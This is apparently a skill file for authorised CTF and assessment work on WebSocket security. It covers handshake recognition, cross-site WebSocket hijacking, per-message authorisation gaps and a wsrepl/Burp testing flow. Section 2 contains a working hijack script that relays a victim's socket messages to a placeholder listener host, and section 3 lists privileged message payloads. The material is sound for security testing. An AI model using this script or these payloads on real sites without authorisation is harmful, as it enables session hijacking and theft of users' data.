name: websocket-security
description: WebSocket security — cross-site WebSocket hijacking (CSWSH), authn/authz gaps in WS messages, and the wsrepl/Burp testing workflow. Use when an app uses real-time channels, chat, notifications, or WS-backed APIs (Upgrade: websocket).
---

# WebSocket Security

Authorized CTF/assessment use. WebSockets carry a persistent channel that often skips the authz checks the REST layer enforces. Two wins: hijack the socket cross-site (CSWSH), or send privileged messages as a low-priv user.

## 1. Recognize the handshake

```
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: <base64>
Sec-WebSocket-Version: 13
→ 101 Switching Protocols + Sec-WebSocket-Accept
```
In Burp/DevTools, filter for `101` / `Upgrade: websocket`. Test with `wsrepl` (a REPL for WS) or Burp's WS tab.

## 2. Cross-site WebSocket Hijacking (CSWSH)

If the WS handshake is authenticated by COOKIE only (no CSRF token / origin check), another site can open a socket to it:
```html
<script>
var ws = new WebSocket("wss://target/socket");
ws.onmessage = e => fetch("//YOUR_LISTENER/?d="+e.data);
ws.onopen = () => ws.send('{"action":"getFlag"}');
</script>
```
Send the victim (who has the session cookie) to your page → their cookie authenticates the socket → your JS reads the messages (flag) and exfils them.

**The tell:** the handshake accepts any `Origin`, or the app doesn't validate `Origin` against an allowlist.

## 3. Authn/authz gaps in messages

- **No per-message authz:** a low-priv user can send admin messages (`{"action":"deleteUser","id":1}`, `{"action":"readFlag"}`).
- **IDOR in WS:** object IDs in WS messages with no ownership check.
- **Client-side filtering:** the server sends everyone's data and the CLIENT filters what to show → read the raw socket for other users' data.
- **Replay/rate:** replay captured messages; WS often skips rate limits.

## 4. Flow

1. Find a WS endpoint (chat, notifications, live dashboard).
2. `wsrepl <wss://target/socket>` or Burp → connect, observe the message format.
3. Test: send privileged/other-ID messages as your low-priv session; check Origin validation; try CSWSH.

## Cross-cutting
- **WS authz is usually weaker than REST authz** — the socket skips the per-request checks.
- **CSWSH needs cookie auth + no Origin check** — test both conditions before claiming it.
- Self-verify: a message you shouldn't be allowed returns another user's data / a privileged action succeeds.
